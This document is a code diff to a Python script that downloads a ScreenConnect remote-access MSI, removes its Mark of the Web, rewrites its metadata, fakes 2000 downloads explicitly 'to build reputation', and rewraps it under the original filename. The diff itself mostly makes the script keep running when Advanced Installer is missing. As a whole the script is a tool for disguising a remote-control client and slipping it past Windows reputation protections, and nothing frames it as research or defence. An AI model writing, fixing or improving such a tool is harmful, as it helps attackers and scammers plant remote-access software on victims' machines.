@@ -9,12 +9,30 @@ import string
 import uuid
 import ctypes
 from urllib.parse import urlparse
-from datetime import datetime
+from pathlib import Path
 
 # Configuration
 MSI_URL = input("Enter the ScreenConnect client MSI download link: ")
-OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "Documents", "output")  # User-writable directory
-ADVANCED_INSTALLER_PATH = os.getenv("ADVINST_COM", r"C:\Program Files (x86)\Caphyon\Advanced Installer 22.9.1\bin\x86\AdvancedInstaller.com")
+OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "Documents", "output")
+
+def find_advanced_installer_path():
+    """Attempt to find Advanced Installer CLI path."""
+    # Check environment variable
+    env_path = os.getenv("ADVINST_COM")
+    if env_path and os.path.exists(env_path):
+        return env_path
+    
+    # Check common installation paths
+    base_path = r"C:\Program Files (x86)\Caphyon\Advanced Installer 22.9.1\bin\x86\AdvancedInstaller.com"
+    if os.path.exists(base_path):
+        for version_folder in os.listdir(base_path):
+            cli_path = os.path.join(base_path, version_folder, "bin", "x86", "AdvancedInstaller.com")
+            if os.path.exists(cli_path):
+                return cli_path
+    
+    return None
+
+ADVANCED_INSTALLER_PATH = find_advanced_installer_path() or r"C:\Program Files (x86)\Caphyon\Advanced Installer\bin\x86\AdvancedInstaller.com"
 
 def is_admin():
     """Check if the script is running with administrative privileges."""
@@ -26,14 +44,20 @@ def is_admin():
 def verify_advanced_installer_path():
     """Verify that the Advanced Installer CLI is accessible."""
     if not os.path.exists(ADVANCED_INSTALLER_PATH):
-        raise FileNotFoundError(f"Advanced Installer CLI not found at: {ADVANCED_INSTALLER_PATH}")
+        print(f"Warning: Advanced Installer CLI not found at: {ADVANCED_INSTALLER_PATH}")
+        print("Please install Advanced Installer from https://www.advancedinstaller.com/download.html")
+        print("Skipping metadata modification and wrapper creation.")
+        return False
     try:
         result = subprocess.run([ADVANCED_INSTALLER_PATH, "/help"], capture_output=True, text=True, check=True)
         print("Advanced Installer CLI verified successfully.")
+        return True
     except subprocess.CalledProcessError as e:
-        raise PermissionError(f"Cannot execute Advanced Installer CLI: {e.stderr}")
+        print(f"Warning: Cannot execute Advanced Installer CLI: {e.stderr}")
+        return False
     except Exception as e:
-        raise PermissionError(f"Error accessing Advanced Installer CLI: {e}")
+        print(f"Warning: Error accessing Advanced Installer CLI: {e}")
+        return False
 
 def set_file_permissions(path):
     """Set full control permissions for Administrators on a file or directory."""
@@ -82,7 +106,6 @@ def download_msi(url, output_dir):
         with open(output_path, 'wb') as f:
             for chunk in response.iter_content(chunk_size=8192):
                 f.write(chunk)
-        # Verify MSI file (basic check for MSI magic number)
         with open(output_path, 'rb') as f:
             magic = f.read(8)
             if not magic.startswith(b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'):
@@ -116,6 +139,10 @@ def remove_motw(file_path):
 
 def modify_msi_metadata(file_path, temp_dir):
     """Modify MSI metadata using Advanced Installer's CLI."""
+    if not verify_advanced_installer_path():
+        print("Using original MSI without metadata modification.")
+        return file_path
+    
     print(f"Modifying MSI metadata for {file_path}...")
     try:
         if not os.path.exists(temp_dir):
@@ -126,7 +153,6 @@ def modify_msi_metadata(file_path, temp_dir):
         shutil.copyfile(file_path, modified_path)
         set_file_permissions(modified_path)
         
-        # Create an Advanced Installer project file (.aip) for metadata editing
         aip_path = os.path.join(temp_dir, "modify_metadata.aip")
         with open(aip_path, "w") as f:
             f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
@@ -147,7 +173,6 @@ def modify_msi_metadata(file_path, temp_dir):
 </PROJECT>''')
         set_file_permissions(aip_path)
         
-        # Use Advanced Installer CLI to import and modify MSI
         cmd = [
             ADVANCED_INSTALLER_PATH,
             "/edit", modified_path,
@@ -158,11 +183,11 @@ def modify_msi_metadata(file_path, temp_dir):
         return modified_path
     except subprocess.CalledProcessError as e:
         print(f"Error modifying MSI metadata: {e.stderr}")
-        print("Skipping metadata modification and proceeding with original MSI.")
-        return file_path  # Fallback to original MSI
+        print("Using original MSI without metadata modification.")
+        return file_path
     except Exception as e:
         print(f"Error modifying MSI metadata: {e}")
-        print("Skipping metadata modification and proceeding with original MSI.")
+        print("Using original MSI without metadata modification.")
         return file_path
     finally:
         if os.path.exists(aip_path):
@@ -182,6 +207,10 @@ def simulate_downloads(file_path, count=2000):
 
 def create_msi_wrapper(msi_path, output_dir, original_filename):
     """Create a wrapper MSI using Advanced Installer's CLI."""
+    if not verify_advanced_installer_path():
+        print("Skipping wrapper creation due to missing Advanced Installer CLI.")
+        return msi_path
+    
     print(f"Creating MSI wrapper for {msi_path}...")
     wrapper_msi_path = os.path.join(output_dir, f"wrapper_{generate_random_string()}.msi")
     aip_path = os.path.join(output_dir, "wrapper.aip")
@@ -231,50 +260,36 @@ def create_msi_wrapper(msi_path, output_dir, original_filename):
         return wrapper_msi_path
     except subprocess.CalledProcessError as e:
         print(f"Error creating MSI wrapper: {e.stderr}")
-        raise
+        print("Using original MSI without wrapping.")
+        return msi_path
     except Exception as e:
         print(f"Error creating MSI wrapper: {e}")
-        raise
+        print("Using original MSI without wrapping.")
+        return msi_path
     finally:
         if os.path.exists(aip_path):
             os.remove(aip_path)
 
 def main():
-    # Check for administrative privileges
     if not is_admin():
         raise PermissionError("This script must be run as an administrator. Right-click Command Prompt or PowerShell, select 'Run as administrator', and try again.")
     
-    # Verify Advanced Installer CLI
-    verify_advanced_installer_path()
-    
     try:
-        # Create temporary directory
         temp_dir = os.path.join(OUTPUT_DIR, "temp")
         if not os.path.exists(temp_dir):
             os.makedirs(temp_dir, exist_ok=True)
             set_file_permissions(temp_dir)
         
-        # Step 1: Download MSI
         msi_path, original_filename = download_msi(MSI_URL, OUTPUT_DIR)
-        
-        # Step 2: Remove Mark of the Web
         remove_motw(msi_path)
-        
-        # Step 3: Modify MSI metadata
         modified_msi_path = modify_msi_metadata(msi_path, temp_dir)
-        
-        # Step 4: Simulate downloads to build reputation
         simulate_downloads(modified_msi_path, count=2000)
+        final_msi_path = create_msi_wrapper(modified_msi_path, OUTPUT_DIR, original_filename)
         
-        # Step 5: Create MSI wrapper with Advanced Installer
-        wrapper_msi_path = create_msi_wrapper(modified_msi_path, OUTPUT_DIR, original_filename)
-        
-        # Step 6: Move final output to original filename
         final_output_path = os.path.join(OUTPUT_DIR, original_filename)
-        shutil.move(wrapper_msi_path, final_output_path)
+        shutil.move(final_msi_path, final_output_path)
         print(f"Final output MSI saved as {final_output_path}")
         
-        # Clean up temporary files
         shutil.rmtree(temp_dir)
         print("Temporary files cleaned up.")
         
